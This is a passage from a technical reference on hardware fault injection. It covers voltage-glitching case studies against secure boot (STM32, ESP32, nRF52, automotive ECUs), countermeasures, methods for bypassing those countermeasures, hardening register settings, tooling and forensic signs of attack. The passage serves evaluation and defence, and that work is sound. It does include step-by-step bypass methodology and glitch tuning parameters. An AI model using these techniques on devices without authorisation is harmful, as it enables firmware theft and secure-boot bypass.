The attack requires exactly one faulty signature. If the fault affected both CRT branches (both s_p and s_q are wrong), the GCD returns 1 or N, and the analyst retries with a different fault timing to hit only one branch.

**Integrated DFA campaign with ChipWhisperer.** The integration loop is straightforward: use the voltage sweep from §13.1, but instead of classifying the response as "success" or "normal," compare the 16-byte ciphertext against the known-correct value. Any ciphertext that differs from the correct one and is not a truncated/garbled response (crash) is a valid DFA fault. Collect unique faulty ciphertexts and call `dfa_aes128_full_key` after each new one. With 2–3 faults in different AES columns, the full 128-bit round-10 key is recovered. The round-10 key is inverted to the original AES-128 key via the standard key-schedule reversal (apply inverse key expansion for 10 rounds).

---

## 9. Secure-boot fault-injection case studies

### 9.1 Nintendo Switch Tegra X1 (CVE-2018-6242 / fusée gelée)

The Nintendo Switch uses an NVIDIA Tegra X1 SoC. The Tegra X1's BootROM contains a USB recovery mode (RCM) that allows loading boot code via USB. CVE-2018-6242, discovered by Kate Temkin in 2018, is a buffer overflow in the RCM USB stack: the BootROM uses the USB control transfer length field to determine how much data to copy into a buffer, but the length field can be set to a value larger than the buffer (up to 65535 bytes for a USB control transfer). The overflow corrupts the BootROM's execution stack, allowing the attacker to redirect execution to arbitrary code loaded via USB.

This is a software vulnerability in the BootROM, not a fault-injection attack. However, because the BootROM is in ROM (not patchable), the vulnerability is permanent for all manufactured units. Nintendo's mitigation was to release revised hardware (Tegra X1+ in the Switch Lite and Switch V2) with a patched BootROM.

The glitch-based alternative: for Tegra X1 units with the software vulnerability patched (via hardware revision), researchers have demonstrated voltage glitching of the BootROM's signature verification, achieving the same effect (unsigned code execution) via hardware attack. The glitch targets the RSA signature verification comparison in the BootROM.

### 9.2 STM32 RDP bypass — detailed methodology

STM32 microcontrollers (STM32F0, F1, F2, F3, F4 families) implement three levels of Read-out Protection (RDP): Level 0 (unprotected — flash readable via debug), Level 1 (debug access to flash blocked, mass erase required to downgrade to Level 0), and Level 2 (permanent — debug permanently disabled, flash unreadable, non-reversible).

The RDP level is stored in the Option Bytes (a dedicated flash region at 0x1FFFF800 on F1 family). At boot, the BootROM reads the Option Bytes and sets the protection level accordingly. Voltage glitching during the Option Byte read can cause the processor to read an incorrect value, interpreting RDP Level 2 as Level 0 (or Level 1).

The practical attack setup: (1) connect a ChipWhisperer to the target's VCC rail (via shunt resistor and decoupling cap removal on the VDD pin), (2) connect the trigger to the target's RESET line or a GPIO that toggles at boot, (3) sweep the glitch offset over the window where the BootROM reads Option Bytes (identified by observing the power trace during boot — the Option Byte read produces a distinctive current spike), (4) for each offset, attempt to connect via SWD after the glitch — if the RDP level was misread, the debug port is accessible and the flash contents can be dumped.

The success rate is typically 0.1–1% per attempt (most glitches either have no effect or cause a reset), requiring 100–1000 boot cycles to achieve a successful dump. The entire process takes minutes to hours.

The technique was publicly demonstrated by researchers at LimitedResults (2020) and has been replicated on multiple STM32 families. STM32L4 and STM32U5 families include enhanced glitch detection (voltage monitoring, boot integrity checks) that make the attack significantly harder but not impossible.

### 9.3 ESP32 secure-boot bypass

The Espressif ESP32 (original revision) implements secure boot by verifying the second-stage bootloader's RSA signature using a key whose hash is stored in eFuse. The secure-boot verification code runs in the BootROM.

Researchers (LimitedResults, 2019) demonstrated voltage glitching of the ESP32's secure-boot signature verification. The attack is complicated by the ESP32's internal voltage regulator (the core voltage is regulated internally, making external VCC glitching less effective). The successful approach was to glitch the 3.3V I/O supply, which affects the flash interface: the glitch causes the flash to return incorrect data during the bootloader image read, and if the corrupted data passes the (also glitch-affected) signature check, the processor boots an unsigned image.

Espressif's mitigation in later ESP32 revisions (ESP32-S2, ESP32-S3, ESP32-C3) includes enhanced glitch detection (brownout detector with faster response time), signature verification redundancy (double-checking the signature with independent code paths), and improved eFuse protection against read glitching.

### 9.4 nRF52 APPROTECT bypass

Nordic Semiconductor's nRF52 series (nRF52832, nRF52840) implements Access Port Protection (APPROTECT): when the APPROTECT register in the UICR (User Information Configuration Register) is set, the SWD debug port is disabled. This prevents flash readout via debug.

Researchers (LimitedResults, 2020) demonstrated voltage glitching of the APPROTECT check during the nRF52's boot sequence. The APPROTECT register is read from flash early in the boot process; glitching the flash read causes the processor to misread the APPROTECT value, leaving the debug port enabled. The attack uses the ChipWhisperer with a trigger on the nRF52's reset line and a glitch offset sweep during the first few milliseconds of boot.

Nordic's mitigation in the nRF5340 and later devices includes hardware-enforced APPROTECT (the protection is implemented in dedicated security logic rather than software-checked flash, making it harder to glitch) and voltage/glitch detection sensors.

### 9.5 Raspberry Pi secure-boot considerations

The Raspberry Pi 4 (BCM2711 SoC) introduced an optional secure-boot mode using OTP (One-Time Programmable) memory to store a public key hash. When enabled, the BootROM verifies the boot image's signature before execution. The Raspberry Pi's secure boot is relatively new and has not been subjected to the same level of public fault-injection research as STM32 or ESP32.

Considerations for FI resistance: the BCM2711's BootROM is in mask ROM (not patchable), the secure-boot key hash is in OTP (not modifiable after programming), and the SoC uses an internal voltage regulator for the core. The main attack surface is glitching the signature verification comparison in the BootROM, similar to the STM32/ESP32 attacks.

### 9.6 TOCTOU faults on eMMC boot media

Chapter 17A introduced the TOCTOU (Time-of-Check-Time-of-Use) attack on eMMC boot media. This section provides the technical details of the hardware interposer approach.

The interposer is a small PCB inserted between the SoC and the eMMC chip. It passes through all eMMC signals (CMD, CLK, DAT0–DAT7) transparently during normal operation. An FPGA on the interposer monitors the eMMC commands and identifies the signature-verification read (the SoC reads specific sectors of the boot image for verification). After the verification read completes, the FPGA enters "substitution mode": subsequent reads to the same sectors return attacker-controlled data from a second flash chip on the interposer.

The timing challenge: the window between the verification read and the execution read may be very short (microseconds to milliseconds). The FPGA must switch modes between two consecutive reads of the same sector, which requires identifying the transition reliably. Some SoCs cache the verified data, reading only once — these are immune to TOCTOU. Others read from flash twice (once for verification, once for execution) — these are vulnerable.

The interposer approach has been demonstrated against automotive ECUs (where the eMMC is a separate BGA chip on the PCB, allowing the interposer to be inserted after mechanical modification) and against some IoT devices. SoCs that use in-package eMMC (package-on-package, where the eMMC is stacked on top of the SoC) are significantly harder to interpose.

### 9.7 Automotive ECU fault injection

Automotive ECUs present a growing FI target as modern vehicles increasingly rely on secure-boot chains and Hardware Security Modules (HSMs) for software integrity and feature activation. The automotive context introduces distinctive challenges and motivations.

The primary target is the ECU's secure-boot verification, which gates whether the ECU will execute modified firmware. Attackers target automotive ECUs for chip tuning (modifying engine control parameters to increase power output or remove emissions controls), feature unlocking (enabling software-locked features without purchasing them from the OEM), and aftermarket diagnostics (gaining unrestricted access to the vehicle's diagnostic interfaces, which are locked down in production firmware).

The physical setup for automotive ECU FI typically involves removing the ECU from the vehicle (or accessing it in-situ via the engine compartment), desoldering or probing the target microcontroller (commonly NXP S32K3xx, Infineon AURIX TC3xx, or Renesas RH850 families), and connecting a ChipWhisperer or custom glitch board to the microcontroller's VCC rail. AURIX TC3xx devices include a Hardware Security Module (HSM) — a dedicated security core with its own flash, SRAM, and crypto accelerator — that performs the secure-boot verification independently from the main cores. Glitching the HSM requires targeting its separate power rail or using EMFI to affect the HSM's die region specifically.

Researchers at Riscure (HITB conference, 2019) demonstrated voltage glitching of an AURIX TC297's HSM secure-boot check. The attack required identifying the HSM's verification timing through power-trace analysis (the HSM's crypto operations produce distinctive power signatures visible even on the shared VCC rail), then delivering a precisely-timed glitch during the comparison of the calculated signature against the stored reference. The success rate was approximately 0.5% per attempt, requiring several thousand boot cycles for reliable exploitation.

Automakers have responded with enhanced SoC-level countermeasures: Infineon's AURIX TC4xx generation includes improved voltage monitoring with sub-50-ns response time, dual-path signature verification in the HSM, and lockstep execution on the main cores (where two cores execute the same instructions in parallel and their outputs are compared — a hardware-level TMR variant that detects instruction-level faults). NXP's S32K3xx family includes an analogous secure enclave (HSE — Hardware Security Engine) with independent voltage monitoring and anti-tamper fuses that permanently disable the device if a configurable number of fault-detection events occur.

---

## 10. Countermeasures

### 10.1 Hardware countermeasures

**Dual-rail logic.** Standard CMOS logic represents 0 and 1 with low and high voltage levels. A gate processing a 0 consumes different power than a gate processing a 1, creating the data-dependent power consumption that enables DPA/CPA. Dual-rail logic encodes each bit as two complementary wires: (0,1) for logical 0 and (1,0) for logical 1. Every gate transition toggles the same number of wires regardless of the data value, making power consumption data-independent.

WDDL (Wave Dynamic Differential Logic) and SABL (Sense Amplifier Based Logic) are two dual-rail implementations. Both approximately double the circuit area and reduce the maximum operating frequency (due to the additional logic). They are primarily used in smartcard and secure-element designs where the area and performance cost is acceptable.

Dual-rail logic primarily defends against side-channel analysis (DPA/CPA) rather than fault injection, but it provides some FI resistance: a fault that affects only one of the two complementary rails produces an invalid encoding (0,0) or (1,1) that can be detected as a fault.

**Voltage and clock monitors (glitch detectors).** Dedicated analog circuits that monitor the supply voltage and clock frequency for deviations outside a specified window. If VCC drops below V_min or rises above V_max, or if the clock period falls outside the expected range, the detector triggers a response (reset the processor, zeroize keys, lock the debug port).

Modern secure microcontrollers (Infineon SLE 78, NXP SmartMX3, STMicroelectronics ST33) include multiple independent glitch detectors with programmable thresholds. The detectors are designed to respond faster than the glitch's effect propagates through the logic — if the detector triggers before the faulty instruction completes, the processor can halt before the faulty result is committed.

Bypass: some detectors can be overwhelmed by carefully-tuned glitches that are too narrow for the detector to sense but sufficient to cause a logic fault (the detector's response time limits its ability to catch very narrow glitches). Multi-pulse glitching (using the first pulse to disable the detector and the second pulse to inject the fault) has been demonstrated against some detector implementations.

**Active shields (metal mesh).** A dense mesh of metal traces covering the chip's top metal layer. The mesh carries a pseudo-random signal; any break in the mesh (from probing, FIB modification, or decapsulation damage) changes the signal and is detected. Active shields protect against physical probing and FIB-based circuit editing but do not directly protect against EMFI or LFI (which do not require physical contact with the die surface).

**Randomized clock (jitter).** The processor's clock is derived from a noisy oscillator (or the PLL's output is phase-modulated with random jitter), making the timing of each clock edge slightly unpredictable. This desynchronizes the glitch timing: a glitch timed to hit a specific clock cycle may hit the wrong cycle due to the jitter. The jitter amplitude must be large enough to span multiple potential glitch windows (typically ±10–20% of the clock period) without exceeding the processor's setup/hold time margins.

Jitter is effective against externally-timed glitches (where the attacker synchronizes to an external event and injects at a fixed offset). It is less effective against internally-triggered glitches (where the attacker uses a side-channel signature to detect the target operation in real-time and triggers immediately).

**Brownout detection (BOR/POR).** Most microcontrollers include a Brown-Out Reset (BOR) circuit that resets the processor if VCC drops below a threshold (typically 2.7V for a 3.3V device). The BOR is a first-line defense against voltage glitching, but its response time (typically 1–10 µs) is too slow to catch nanosecond-scale glitches. Enhanced BOR circuits with faster response (< 100 ns) are found in secure microcontrollers.

### 10.2 Software countermeasures

**Instruction redundancy (double-check comparisons).** Instead of a single conditional branch:

```c
if (signature_valid) { boot(); }
```

The code performs the check twice with independent logic:

```c
result1 = verify_signature(image, key);
result2 = verify_signature_independent(image, key);
if (result1 == SUCCESS && result2 == SUCCESS) {
    if (result1 == SUCCESS) { /* third check */
        boot();
    }
}
```

A single-glitch instruction skip bypasses one check but not all three. The attacker must inject multiple precisely-timed glitches within a few clock cycles, which is exponentially harder than a single glitch.

The redundancy must use independent code paths (not just repeating the same instruction, which a control-flow hijack could skip entirely). Ideally, the two verification routines use different algorithms or different code (to prevent a single glitch from corrupting both).

**Triple-Modular Redundancy (TMR).** Critical computations are performed three times (potentially by three different hardware units or three different software paths). The results are compared by a majority voter: if two of three agree, that result is used; if all three disagree, a fault is flagged. TMR tolerates a single fault in any one of the three paths.

TMR triples the computation time and code size, making it impractical for performance-critical operations. It is used selectively for the most security-critical checks (signature verification, key management, protection-level checks).

**Infective computation.** Rather than detecting a fault and halting, infective countermeasures propagate the fault's effect so that the output is completely corrupted (useless to the attacker) rather than partially corrupted (analyzable by DFA).

The concept: after a computation that may have been faulted, inject an additional computation whose input depends on the correct result. If the intermediate result was faulted, the injected computation produces a wildly incorrect output that cannot be correlated with the correct output. This defeats DFA, which relies on the faulty output being "close" to the correct output (differing in a few bytes due to a single-byte fault).

Infective computation for AES (Tupsamudre, Bisht, Mukhopadhyay, 2014): after each AES round, compute a checksum of the round output and XOR it into the state of the next round. If a round was faulted, the checksum is wrong, and the XOR propagates the error through all subsequent rounds, making the ciphertext completely wrong (no correlation with the correct ciphertext or with the fault model).

**Fault detection codes.** Each intermediate value carries a redundant checksum (parity, CRC, or a more complex error-detecting code). After each operation, the checksum is recomputed and compared with the expected value. A fault that corrupts the data also corrupts the checksum, causing a mismatch that triggers fault detection.

For AES implementations, each state byte can carry a 4-bit parity code (protecting against single-nibble faults). The code overhead is approximately 50% (4 extra bits per 8-bit state byte). More efficient codes (linear codes over GF(2^8)) can protect against broader fault models with lower overhead.

**Temporal redundancy (re-execute and compare).** The computation is performed twice, and the results are compared. If they differ, a fault is assumed and the result is discarded. This doubles the computation time but provides strong protection against single-fault injection (the attacker must inject identical faults in both executions, which requires two precisely-timed glitches with identical parameters).

For the protection to be effective, the two executions must not be susceptible to the same glitch (e.g., they should occur at different times, using different registers or memory locations, so a single glitch affects only one execution). Some implementations shuffle the order of operations between the two executions to further decorrelate them. An advanced variant uses instruction-level interleaving, where the two redundant computations are intermixed at the instruction level so that consecutive instructions belong to different execution instances — a single glitch that corrupts one instruction is immediately detected by the comparison at the end, and achieving two faults in the correct instructions of the correct instances requires sub-nanosecond double-glitch precision that is beyond practical voltage or EMFI capabilities.

**Control-flow integrity for embedded.** Software-based CFI techniques adapted for resource-constrained embedded processors: each basic block contains a unique tag (a constant loaded into a register at block entry), and each transition checks the tag against the expected value. A fault that corrupts the program counter causes execution to land in a block with the wrong tag, triggering detection.

This is a simplified version of the software shadow-call-stack concept described in Domain 4B §9.5, adapted for microcontrollers that lack the memory and performance budget for full shadow stacks. The tag size (8–32 bits) determines the probability of an undetected fault (a random PC corruption that happens to land on a block with the correct tag is undetected, with probability 2^(-tag_bits)).

**Random delays and dummy operations.** Inserting random-length delays (busy loops with random iteration counts) and dummy operations (computations on random data whose results are discarded) between security-critical operations desynchronizes the fault timing. The attacker cannot predict the clock cycle of the target operation, making precise glitch timing harder.

This is a "defense in depth" measure that increases the attacker's search space (the glitch offset must be swept over a wider range) without preventing the attack entirely (the attacker can still find the right timing by sweeping, albeit with more effort).

### 10.3 Combined hardware+software defense-in-depth

High-security implementations (payment cards, secure elements, HSMs) combine multiple countermeasures:

1. **Hardware layer**: voltage/clock monitors with < 100 ns response time, active shield, light sensors (for optical/laser FI detection), temperature sensor (for cold-boot and heating attacks), randomized clock with ±15% jitter.

2. **Logic layer**: dual-rail logic for the crypto engine, TMR for the boot-verification comparator, fault-detection codes on the AES state.

3. **Software layer**: double (or triple) signature verification with independent code paths, infective computation in the crypto implementation, random delays between operations, software CFI for the boot sequence.

4. **Response layer**: on fault detection, zeroize keys, lock the chip permanently (set an OTP fuse that disables all further operation), and log the fault event (if possible — some secure elements have a tamper log).

No single countermeasure is sufficient against a well-resourced attacker. The goal is to require the attacker to bypass multiple independent defenses simultaneously, which increases the attack cost (equipment, time, expertise) exponentially.

### 10.4 Certification standards

**Common Criteria (CC)**: the Common Criteria for Information Technology Security Evaluation (ISO/IEC 15408) evaluates products against Protection Profiles (PPs) that specify security requirements. For smartcards and secure elements, the PP defines attack potential in terms of equipment (basic, specialized, bespoke), expertise (layman, proficient, expert, multiple experts), and time (hours, days, weeks, months). Fault injection with commercial equipment (ChipWhisperer, Riscure Inspector) is rated as "specialized equipment / expert attacker / days to weeks" — a moderate attack potential. Laser FI with custom multi-spot setups is rated "bespoke equipment / multiple experts / months" — high attack potential.

CC evaluations at EAL4+ (Evaluation Assurance Level 4 and above, with AVA_VAN.4 or AVA_VAN.5 vulnerability analysis) include physical fault-injection testing by the evaluation laboratory. The lab performs voltage glitching, EMFI, and (at higher levels) LFI against the product and reports whether any security functions can be bypassed.

**FIPS 140-3**: the US/Canadian standard for cryptographic modules. Physical security levels: Level 1 (no physical security requirements), Level 2 (tamper evidence — seals/coatings), Level 3 (tamper resistance — active response to tampering), Level 4 (tamper detection and response in multi-fault scenarios, including environmental attacks). Level 3 and 4 require protection against voltage/temperature/EM attacks.

**EMVCo**: the payment industry's security evaluation methodology. EMVCo evaluations include mandatory fault-injection testing (voltage glitching, EMFI) against the payment chip's boot process, key management, and transaction-processing logic. EMVCo evaluations are performed by accredited laboratories and are required for all payment cards and payment terminals.

### 10.5 Countermeasure bypass techniques

The countermeasures in §10.1–10.2 are not impenetrable. Well-resourced evaluators employ specific strategies to defeat them.

**Double-fault attacks.** Instruction redundancy (§10.2) adds a second comparison after the first. A single glitch skips the first check but the second catches the anomaly. The bypass: inject two glitches in rapid succession — the first skips the primary check, the second skips the redundancy check. The timing gap between the two checks is typically 2–10 clock cycles (for software redundancy) or 1 cycle (for hardware TMR voter), and the attacker must deliver two glitch pulses within this window. On ChipWhisperer, the `scope.glitch.repeat` parameter controls the number of consecutive pulses — setting `repeat = 2` with appropriate width produces a double-pulse burst. The practical challenge is that the two checks may not be at fixed relative timing (due to random delays or interleaving), requiring the attacker to sweep both the first glitch's offset and the inter-pulse gap.

**Multi-glitch synchronized attacks.** Extending double-fault to three or more glitches targets TMR and triple-comparison schemes. The attacker programs multiple independent glitch channels (on platforms that support it, such as ChipWhisperer-Pro with its secondary glitch output, or custom FPGA platforms with multiple MOSFET drivers) to fire at programmed offsets from the trigger. Each channel targets a different comparison or verification step. The probability of all glitches succeeding simultaneously is the product of their individual success probabilities — for three independent glitches each at 1% success rate, the combined probability is 10^-6, requiring approximately one million attempts. At 100 ms per attempt, this is approximately 28 hours — feasible for a determined evaluator.

**Combined voltage + clock attacks.** Voltage glitching and clock glitching affect different parts of the target's logic (voltage affects all gates simultaneously; clock affects only the critical path timing). Combining both can produce faults that neither technique achieves alone. The setup requires the target to use an external clock (from the ChipWhisperer) while simultaneously being connected to the voltage glitch output. The analyst programs a clock glitch to weaken the critical-path margin and a voltage glitch to push the weakened path into failure — effectively lowering the required voltage-glitch amplitude below the brownout detector's threshold, bypassing the BOR countermeasure.

**Countermeasure-aware parameter tuning.** Voltage monitors have a minimum response time (the detector's analog bandwidth). Glitches shorter than this response time pass undetected. The analyst characterizes the detector's bandwidth by sweeping the glitch width downward until the detector stops triggering (observed via the target's reset behavior — detector-triggered resets produce a specific reset-cause flag, while successful glitches that evade the detector produce no flag). The practical lower bound on undetectable glitch width is 5–20 ns for modern secure microcontrollers, which is still sufficient to cause single-instruction faults on devices running at 50–200 MHz.

**Timing analysis to find vulnerable windows.** SPA (power analysis) reveals the temporal location of security-critical operations within the execution flow. The analyst captures a power trace during normal boot, identifies distinctive signatures (the flash read for option bytes, the signature verification computation, the comparison and branch), and uses these signatures to set the glitch trigger offset. On the ChipWhisperer-Husky, the SAD trigger (§13.6) automates this: the analyst captures a reference trace of the target operation, loads it as the SAD pattern, and the scope triggers automatically when the target reaches that point in execution — no GPIO trigger or UART event needed.

### 10.6 Platform-specific hardening configuration

The following tables document the security-relevant configuration registers and settings for common microcontroller families targeted by fault injection. Each entry includes the register, default value, hardened value, and the protection it provides.

**STM32 family (STMicroelectronics)**

| Feature | Register / mechanism | Default | Hardened setting | Protection |
|---------|---------------------|---------|-----------------|------------|
| Read-out protection | Option Bytes: `RDP` byte at `0x1FFFF800` (F1) / `0x1FFF7800` (F4) | `0xAA` (Level 0) | `0xCC` (Level 2, permanent) | Disables debug, blocks flash readout |
| Write protection | Option Bytes: `WRP` bits | Unprotected | Set WRP for all flash sectors | Prevents flash modification |
| PCROP (F4/L4/U5) | `FLASH_OPTCR` register | Disabled | Enable per-sector PCROP | Code read-out prevention (execute-only) |
| BOR level | Option Bytes: `BOR_LEV` | Level 0 (1.7V) | Level 4 (2.7V for 3.3V targets) | Faster brownout detection threshold |
| Tamper pins (F4/L4) | `RTC_TAMPCR` | Disabled | Enable TAMPER1/TAMPER2 with active level | External tamper detection via GPIO |

Configuration command (STM32CubeProgrammer):
```
STM32_Programmer_CLI -c port=SWD -ob RDP=0xCC BOR_LEV=4 WRP0=0xFF
```

**nRF52 / nRF53 family (Nordic Semiconductor)**

| Feature | Register / mechanism | Default | Hardened setting | Protection |
|---------|---------------------|---------|-----------------|------------|
| APPROTECT | UICR `0x10001208` | `0xFFFFFFFF` (disabled) | `0x00000000` (enabled) | Disables SWD debug access |
| SECUREAPPROTECT (nRF5340) | UICR `0x10001210` | `0xFFFFFFFF` | `0x00000000` | Disables debug on secure domain |
| ACL (Access Control List) | `ACL.ACL[n].ADDR/SIZE/PERM` | No regions | Configure for flash/RAM regions | Per-region read/write/execute protection |
| SPU (nRF5340) | `SPU.FLASHREGION[n].PERM` | All non-secure | Mark boot + crypto as Secure | TrustZone-M partitioning |

Configuration via nrfjprog:
```
nrfjprog --memwr 0x10001208 --val 0x00000000 --family NRF52
nrfjprog --eraseuicr   # caution: erases all UICR — backup first
```

**ESP32 family (Espressif)**

| Feature | Register / mechanism | Default | Hardened setting | Protection |
|---------|---------------------|---------|-----------------|------------|
| Flash encryption | eFuse `FLASH_CRYPT_CNT` | Disabled | Burn odd number of bits (1/3/5/7) | AES-256 encryption of flash contents |
| Secure Boot V2 | eFuse `ABS_DONE_1` | Not set | Burn fuse | RSA-3072 or ECDSA signature verification |
| JTAG disable | eFuse `JTAG_DISABLE` | Not set | Burn fuse | Permanently disables JTAG/debug |
| UART download disable | eFuse `UART_DOWNLOAD_DIS` | Not set | Burn fuse | Disables ROM bootloader UART download |

Configuration via espefuse:
```
espefuse.py burn_efuse ABS_DONE_1
espefuse.py burn_efuse JTAG_DISABLE
espefuse.py burn_key flash_encryption key.bin FLASH_ENCRYPTION
```

**NXP LPC / i.MX family**

| Feature | Register / mechanism | Default | Hardened setting | Protection |
|---------|---------------------|---------|-----------------|------------|
| CMPA (LPC55S69) | Protected Flash Region (PFR) at `0x0009E400` | Unconfigured | Set `CC_SOCU_DFLT` to disable debug | Customer Manufacturing Configuration Area |
| CFPA (LPC55S69) | PFR at `0x0009E000` | Unconfigured | Set `DCFG_CC_SOCU_NS_PIN/DFLT` | Field-updatable security configuration |
| HAB (i.MX) | eFuse `SRK_LOCK` | Open | Burn SRK hash, set SEC_CONFIG=Closed | High Assurance Boot — signed image only |
| AHAB (i.MX8/9) | SECO/EdgeLock Enclave | Open | Provision lifecycle to OEM Closed | Advanced HAB with secure enclave |

**Microchip SAM family**

| Feature | Register / mechanism | Default | Hardened setting | Protection |
|---------|---------------------|---------|-----------------|------------|
| BOOTPROT | NVM User Row `NVMCTRL_USER` bits 2:0 | 0 (no protection) | Set to protect boot region size | Write-protect bootloader region |
| SECURITY_BIT | NVM `NVMCTRL_STATUS.SEC` | Not set | Set via NVM command | Disables external debug and NVM read |
| NONSECA (SAM L11) | `NVMCTRL_NONSECA` | All non-secure | Configure secure flash regions | TrustZone-M secure/non-secure flash partition |

---

## 11. Tooling ecosystem

### 11.1 ChipWhisperer platform family

The ChipWhisperer platform (NewAE Technology) is the most widely used open-source hardware-security research platform. The product line:

**ChipWhisperer-Nano**: the entry-level board. Supports basic voltage glitching and power measurement. Limited ADC bandwidth (10-bit, ~20 MS/s). Suitable for educational use and simple targets. Cost: approximately $50–100.

**ChipWhisperer-Lite**: the standard research board. 10-bit ADC at 105 MS/s, hardware voltage glitching (crowbar), clock glitching, trigger system. Compatible with the CW308 target board system. Cost: approximately $250–350.

**ChipWhisperer-Husky**: the current-generation board. 12-bit ADC at 200 MS/s, dual glitch MOSFETs, advanced trigger system (pattern match, SAD trigger for analog-domain triggering), USB 3.0 for fast data transfer, FPGA-based glitch engine with sub-ns resolution. Compatible with CW308 and standalone targets. Cost: approximately $500–700.

**ChipWhisperer-Pro**: the previous high-end board (now replaced by Husky for most users). Similar capabilities to Husky with some additional I/O options. Cost: approximately $1,000.

All ChipWhisperer boards are controlled via a Python API (`chipwhisperer` package), with Jupyter Notebook tutorials covering attack tutorials from basic power analysis through DFA and secure-boot glitching.

### 11.2 ChipSHOUTER

The ChipSHOUTER (NewAE Technology) is a dedicated EMFI platform — a high-voltage pulse generator designed for electromagnetic fault injection. It generates pulses of up to 500V into low-impedance coils, producing strong EM fields for fault injection through packaging.

The ChipSHOUTER includes a built-in trigger input (compatible with ChipWhisperer and other trigger sources), adjustable pulse voltage (50–500V), and a selection of included EMFI probes (different coil diameters). Cost: approximately $500–1,200.

The ChipSHOUTER is a productized version of the PicoEMP concept, with better pulse control, higher maximum voltage, built-in safety features (emergency shutdown, charge-level monitoring), and certified EMC compliance. For researchers who need higher pulse voltages or more consistent pulse delivery than the DIY PicoEMP, the ChipSHOUTER is the standard choice.

### 11.3 PicoEMP build

The PicoEMP is fully open-source (design files on GitHub under the NewAE organization). A DIY build requires:
- PCB fabrication (2-layer board, standard process).
- Components: a boost converter (to charge the capacitor bank to 200–300V from 5V USB), a thyristor or MOSFET switch, ceramic capacitors (100 nF × 4 in parallel for the pulse bank), an EMFI coil (hand-wound on a ferrite core or 3D-printed mandrel), and a trigger input circuit.
- Total component cost: approximately $10–30.
- Assembly: soldering surface-mount components (0603/0805 packages), winding the coil, and assembling the probe.

The PicoEMP build is popular in academic courses and workshops because it demonstrates EMFI principles at minimal cost. For research use, the ChipSHOUTER provides better repeatability and higher pulse energy.

### 11.4 Riscure Inspector

Riscure Inspector is the commercial leader in hardware-security evaluation tooling. The platform includes:
- **Inspector SCA**: a side-channel analysis workstation with high-resolution ADC (12–14 bit, 1 GS/s), automated trace capture, DPA/CPA/template attack modules, leakage assessment (TVLA), and reporting tools.
- **Inspector FI**: a fault-injection workstation with voltage glitching, clock glitching, EMFI (integrated with X-Y-Z motorized stage), and laser FI (optional, using Riscure's laser platform with 1064 nm and 532 nm sources).
- **EM Probe Station**: a shielded enclosure with a motorized X-Y-Z stage, EM probes, and optical camera for probe positioning.

Riscure Inspector is the standard platform in Common Criteria and EMVCo evaluation laboratories. Cost: $50,000–$500,000+ depending on configuration.

### 11.5 GIAnT and other platforms

**GIAnT (Generic Implementation ANalysis Toolkit)**: an open-source EMFI and voltage glitching platform developed by Fraunhofer AISEC. It provides higher pulse voltages than PicoEMP (up to 1kV) and supports both EMFI and voltage glitching in a single platform.

**Custom FPGA-based platforms**: many research groups build custom glitching platforms using commodity FPGAs (Xilinx/AMD, Intel/Altera, Lattice). The FPGA implements the glitch timing logic, trigger system, and clock manipulation. The FPGA connects to a custom analog front-end (MOSFET driver for voltage glitching, high-voltage pulse circuit for EMFI) and to a PC via USB or Ethernet.

**Open-source glitching frameworks**: `chipwhisperer` (Python), `scaffolding` (Python, from Riscure's community tools), and various academic tools. These frameworks provide the software infrastructure for automated parameter sweeps, result logging, and analysis.

---

## 12. Detection and forensic indicators of fault injection

### 12.1 Physical evidence of fault injection

Fault injection leaves distinctive physical and electronic evidence that forensic examiners should look for when analyzing potentially compromised hardware.

**Board-level modifications.** Voltage glitching requires access to the target's power rail. The attacker typically removes decoupling capacitors near the target IC to reduce filtering (a decoupled rail absorbs glitch pulses before they reach the die). Missing or desoldered decoupling caps are a strong indicator. The attacker may also solder wires directly to VCC and GND pads, add a shunt resistor for trigger measurement, or install headers for probe connection. These modifications are visible under visual inspection and may leave solder flux residue, scratched solder mask, or misaligned component pads.

**Decapsulation marks.** Laser FI and BBI require die access, which means chip decapsulation. Chemical decapsulation (using fuming nitric acid or sulfuric acid with hydrogen peroxide) dissolves the epoxy mold compound. Forensic indicators include: discoloration of the PCB around the target IC, acid residue on the board, a visible cavity where the package material was removed, and exposed bond wires or die surface. Mechanical decapsulation (CNC milling of the package) leaves tool marks on the remaining package material. Some decapsulation techniques are semi-destructive (the device may still function after decapsulation), so the presence of decapsulation marks does not necessarily mean the device is non-functional.

**Probe contact marks.** BBI probes and near-field EM probes positioned on or near the die leave physical marks. Tungsten probes used for BBI can scratch the passivation layer or metallization, visible under optical microscopy. Repeated EMFI coil contact with the package surface may leave polishing marks or indentations in the mold compound.

### 12.2 Electronic and behavioral indicators

**Brownout detector trips.** Modern microcontrollers include brownout detectors (BOD) that monitor the supply voltage and trigger a reset if VCC drops below a threshold. Voltage glitching intentionally drives VCC below this threshold, so the BOD fires. Forensic firmware analysis should check whether the BOD reset counter has been incremented anomalously. On STM32, the RCC_CSR register contains a BORRSTF (brownout reset flag) bit; an excessive number of brownout resets in the device's operational log suggests glitching attempts. Similar flags exist on nRF52 (RESETREAS.SREQ, RESETREAS.DOG) and ESP32 (RTC_CNTL_RESET_CAUSE_REG).

**Watchdog resets.** Glitching that disrupts the processor's execution flow causes it to miss watchdog timer servicing, triggering a watchdog reset. An anomalous pattern of watchdog resets (many resets in rapid succession, inconsistent with normal operational patterns like power fluctuations) is an indicator of active glitching attempts. The watchdog reset count, if logged to non-volatile storage, provides a forensic timeline.

**Boot loop detection.** During a glitch parameter sweep against secure boot, the target device is reset hundreds or thousands of times in rapid succession (one reset per glitch attempt). If the device logs reset events with timestamps to non-volatile storage, a burst of resets at regular intervals (e.g., every 50–500 ms, corresponding to the glitch sweep rate) is a strong indicator.

**Flash wear anomalies.** Some glitching campaigns involve writing to flash during each attempt (e.g., logging test data or manipulating configuration). NOR/NAND flash has finite write endurance (typically 10,000–100,000 cycles per page for NOR, 1,000–10,000 for NAND). Anomalous wear patterns (pages with disproportionately high erase counts) may indicate that specific flash regions were targeted during an attack campaign.

### 12.3 Countermeasure telemetry and tamper response

**Glitch detector logs.** Hardware glitch detectors (analog comparators monitoring VCC, clock frequency monitors, temperature sensors) generate interrupt events when they detect anomalous conditions. High-security devices (smartcards, secure elements, HSMs) log these events to tamper-evident storage. The tamper log provides a record of the attack: timestamps of glitch detection events, the type of anomaly detected (voltage, clock, temperature, light), and the device's response (reset, key zeroization, permanent lockout).

